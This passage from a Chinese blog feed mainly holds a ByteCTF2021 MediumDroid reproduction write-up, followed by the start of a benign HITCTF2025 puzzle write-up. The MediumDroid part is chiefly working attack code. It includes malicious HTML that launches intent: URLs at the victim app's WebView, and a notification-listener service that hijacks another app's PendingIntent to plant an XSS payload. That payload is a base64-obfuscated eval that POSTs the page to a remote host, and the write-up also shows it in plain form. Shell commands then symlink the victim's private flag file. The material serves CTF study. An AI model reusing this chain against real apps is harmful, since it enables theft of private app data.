symlink.html，指向被污染的flag，而第一步中的恶意html会再设置一个Intent跳转延迟执行，这个Intent与前者不同点就是S.url&#x3D;file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.bytectf.pwnmediumdroid&#x2F;files&#x2F;symlink.html ，从而导致在TestActivity中再次通过WebView加载url时渲染symlink.html ，这导致被污染的flag文件被渲染，从而触发注入到flag中的恶意代码，将内容传送到远程</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> location.<span class="property">href</span>=<span class="string">&quot;intent:dsad#Intent;package=com.bytectf.mediumdroid;component=com.bytectf.mediumdroid/.TestActivity;S.url=http%3A%2F%2Fxxx.xxx.xxx.xxx%2Fevil4.html;end&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jump2</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">href</span>=<span class="string">&quot;intent:dsad#Intent;package=com.bytectf.mediumdroid;component=com.bytectf.mediumdroid/.TestActivity;S.url=file:///data/data/com.bytectf.pwnmediumdroid/files/symlink.html;end&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(jump2, <span class="number">12000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="构建攻击APP"><a href="#构建攻击APP" class="headerlink" title="构建攻击APP"></a>构建攻击APP</h2><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Intent</span> <span class="variable">tmpIntent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, MagicService.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>,<span class="string">&quot;com.bytectf.mediumdroid.MainActivity&quot;</span>);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;http://toutiao.com@xxx.xxx.xxx.xxx/evil3.html&quot;</span>));</span><br><span class="line">        Log.d(<span class="string">&quot;TEST&quot;</span>,intent.toUri(Intent.URI_INTENT_SCHEME));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MagicService &#x3D; NotificationListenerService</p><p>用来监听系统通知,拿到通知里的PendingIntent</p><p>evil.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  location.<span class="property">href</span> =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;intent://test#Intent;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;component=com.bytectf.mediumdroid/.TestActivity;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;S.url=http%3A%2F%2Fxxx%2Fevil2.html;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;end&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    location.<span class="property">href</span> =</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;intent://test#Intent;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;component=com.bytectf.mediumdroid/.TestActivity;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;S.url=file:///data/data/com.bytectf.pwnmediumdroid/files/symlink.html;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;end&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;, <span class="number">3000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先跳到 TestActivity，让它加载第二阶段页面</p><blockquote><p>注意：LLeaves博客里提到 S.url 里的 <code>&quot;http://&quot;&quot;</code> 的 <code>&quot;://&quot;&quot;</code> 最好编码，否则可能被转 https，把 <code>&quot;http://1.2.3.4/evil2.html&quot;</code> 编成 <code>&quot;http%3A%2F%2F1.2.3.4%2Fevil2.html&quot;</code></p></blockquote><p>延迟再跳一次 TestActivity，让它加载 file:&#x2F;&#x2F; 的 symlink.html（指向被污染 flag）</p><p>AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.BIND_NOTIFICATION_LISTENER_SERVICE&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">&quot;ProtectedPermissions&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Mediumdroid&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MagicService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>BIND_NOTIFICATION_LISTENER_SERVICE</p><p>这是一个 <strong>系统级高权限</strong>：</p><blockquote><p>允许 App 绑定并运行 <code>NotificationListenerService</code></p></blockquote><p>监听系统中 <strong>所有通知</strong></p><p>拿到：</p><ul><li>Notification 对象</li><li>Notification 里的 <strong>PendingIntent</strong></li><li>包名 &#x2F; 内容 &#x2F; Action</li></ul><p>tools:ignore&#x3D;”ProtectedPermissions”</p><ul><li>这是 <strong>受保护权限</strong></li><li>普通 App 在 Manifest 里声明会被 lint 报警告</li><li><strong>只影响编译期检查</strong>，不影响系统行为</li></ul><p>没有 NotificationListenerService，无法send和修改PendingIntent</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.setContentIntent(</span><br><span class="line">    PendingIntent.getBroadcast(this, 0, new Intent(), 0)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这个 PendingIntent,被塞进了 Notification,只存在于系统的 NotificationManager 里,不在Intent文件,Binder 接口,公共 API,默认对其他 App 完全不可见</p><p>普通 App 能做到的：发通知（自己发的）,清除通知（自己发的）</p><p>普通 App做不到的：读取其他 App 的通知内容,访问通知里的 PendingIntent,Hook 系统通知列表</p><p>NotificationListenerService 是Android 给系统级通知管理 App开的后门：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MagicService</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">NotificationListenerService</span></span><br></pre></td></tr></table></figure><p>这是唯一合法拿到别的 App 通知里的 PendingIntent的方式</p><p>MagicService</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnmediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.PendingIntent;</span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.service.notification.NotificationListenerService;</span><br><span class="line"><span class="keyword">import</span> android.service.notification.StatusBarNotification;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MagicService</span> <span class="keyword">extends</span> <span class="title class_">NotificationListenerService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MagicService</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;SeviceStart&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onListenerConnected</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;onListenerConnected&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.onListenerConnected();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createSymlink</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dataDir</span> <span class="operator">=</span> <span class="string">&quot;/data/data/&quot;</span> + getPackageName();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;rm -rf &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;mkdir &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/com.bytectf.mediumdroid/files/flag&quot;</span> + <span class="string">&quot; &quot;</span> + dataDir + <span class="string">&quot;/files/symlink.html&quot;</span>).waitFor();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;chmod 777 -R &quot;</span> + dataDir + <span class="string">&quot;/files&quot;</span>).waitFor();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationPosted</span><span class="params">(StatusBarNotification sbn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onNotificationPosted(sbn);</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;onNotificationPosted&quot;</span>);</span><br><span class="line">        <span class="type">PendingIntent</span> <span class="variable">pendingIntent</span> <span class="operator">=</span> sbn.getNotification().contentIntent;</span><br><span class="line">        Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;Get PendingIntent&quot;</span> + pendingIntent);</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>);</span><br><span class="line">        intent.setPackage(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> <span class="string">&quot;&lt;img src=\&quot;x\&quot; onerror=\&quot;evaeGhyPW5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignUE9TVCcsICdodHRwOi8veHh4Lnh4eC54eHgueHh4Onh4eCcsIHRydWUpOyB4aHIuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOyB4aHIuc2VuZCgnaHRtbD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5vdXRlckhUTUwpKTs=&#x27;))\&quot;&gt;&quot;</span>;</span><br><span class="line">        intent.putExtra(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&lt;html&gt;&quot;</span> + html + <span class="string">&quot;&lt;/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            pendingIntent.send(<span class="built_in">this</span>, <span class="number">0</span>, intent, <span class="keyword">new</span> <span class="title class_">PendingIntent</span>.OnFinished() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSendFinished</span><span class="params">(PendingIntent pendingIntent, Intent intent, <span class="type">int</span> i, String s, Bundle bundle)</span> &#123;</span><br><span class="line">                    Log.d(<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;onSendFinished&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        createSymlink();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PendingIntent.CanceledException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;onBind&quot;</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onBind(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationRemoved</span><span class="params">(StatusBarNotification sbn)</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;onNotificationRemoved&quot;</span> );</span><br><span class="line">        <span class="built_in">super</span>.onNotificationRemoved(sbn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用来 <strong>监听 MediumDroid 发出的通知 → 拿到通知里的 PendingIntent → 篡改 Intent → 以 MediumDroid 身份发送广播 → 触发 FlagReceiver 写 flag → 再制造 symlink 读取 flag</strong>。</p><p>createSymlink:在攻击 App 自己的私有目录里，创建一个指向 MediumDroid flag 文件的符号链接</p><p>onNotificationPosted:任何 App 发通知，都会触发，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>);</span><br></pre></td></tr></table></figure><p>指定：action &#x3D; FlagReceiver 的 action，package &#x3D; MediumDroid</p><p> <strong>目标：触发非 exported 的 FlagReceiver</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MediumDroid TestActivity</span><br><span class="line"> ↓</span><br><span class="line">Te3t() 发通知（带空 PendingIntent）</span><br><span class="line"> ↓</span><br><span class="line">MagicService.onNotificationPosted()</span><br><span class="line"> ↓</span><br><span class="line">拿到 PendingIntent</span><br><span class="line"> ↓</span><br><span class="line">fillIn(action + extras)</span><br><span class="line"> ↓</span><br><span class="line">pendingIntent.send()</span><br><span class="line"> ↓</span><br><span class="line">MediumDroid FlagReceiver 被触发</span><br><span class="line"> ↓</span><br><span class="line">flag 文件被写成恶意 HTML</span><br><span class="line"> ↓</span><br><span class="line">onSendFinished()</span><br><span class="line"> ↓</span><br><span class="line">createSymlink()</span><br><span class="line"> ↓</span><br><span class="line">WebView 加载 symlink.html</span><br><span class="line"> ↓</span><br><span class="line">读取 / 外带 flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260122215118878.png" alt="image-20260122215118878"></p><p>这里还需要设置一下</p><p>要去系统设置里打开通知监听权限：</p><blockquote><p>设置 → Apps &amp; notifications（或 Notifications）→ Special app access → Notification access → </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260122221522186.png" alt="image-20260122221522186"></p><p>注意你如果想要持续攻击 切换你编码的那一块的话一定要把之前的攻击删掉再进行</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260122222943338.png" alt="image-20260122222943338"></p><blockquote><p>此外不太建议使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.send(&#x27;html=&#x27; + encodeURIComponent(document.documentElement.outerHTML));</span><br></pre></td></tr></table></figure><p>有时无法读出flag 因为需要解析HTML元素</p><p>推荐使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr=new XMLHttpRequest(); xhr.open(&#x27;POST&#x27;, &#x27;http://xxxxxx:4080&#x27;, true); xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;); xhr.send(&#x27;html=&#x27; + encodeURIComponent(document.documentElement.innerText));</span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-MediumDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-MediumDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 MediumDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF2025 wp</title>
    <link href="http://matriy330.github.io/1732c87e/"/>
    <id>http://matriy330.github.io/1732c87e/</id>
    <published>2026-01-15T07:02:00.000Z</published>
    <updated>2026-01-15T07:02:09.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HITCTF2025-wp"><a href="#HITCTF2025-wp" class="headerlink" title="HITCTF2025 wp"></a>HITCTF2025 wp</h1><p>好久没更新了，期末考试太忙了，之前打的比赛传一下</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="5-Layer-Fog"><a href="#5-Layer-Fog" class="headerlink" title="5-Layer-Fog"></a>5-Layer-Fog</h3><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062053695.png" alt="image-20251206205348655"></p><p>uMkIvhvNuWSdaWu5tXW0qNAotWoeaXyCvMT5egIvqjqbSqEEy3ylSW4wUhgASqo3unywvrEmUhcYSNu4tnv5rrAlvZEhwqALtjAIUg&#x3D;&#x3D;</p><p>Subject: C&#x3D;CN, O&#x3D;HITCTF, CN&#x3D;algorithms: Xor+Base64, Rot13, BasE64, CaEsAr(3), SwApCaSe</p><p>swapcase → caesar(-3) → rot13-&gt;base64 解码-&gt;单字节 XOR key 为 0x40-&gt;最后再 base64 解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;uMkIvhvNuWSdaWu5tXW0qNAotWoeaXyCvMT5egIvqjqbSqEEy3ylSW4wUhgASqo3unywvrEmUhcYSNu4tnv5rrAlvZEhwqALtjAIUg==&quot;</span></span><br><span class="line"></span><br><span class="line">low, up = string.ascii_lowercase, string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">txt: <span class="built_in">str</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">  res = []</span><br><span class="line">  <span class="keyword">for</span> ch <span class="keyword">in</span> txt:</span><br><span class="line">      <span class="keyword">if</span> ch.islower():</span><br><span class="line">          res.append(low[(low.index(ch) + shift) % <span 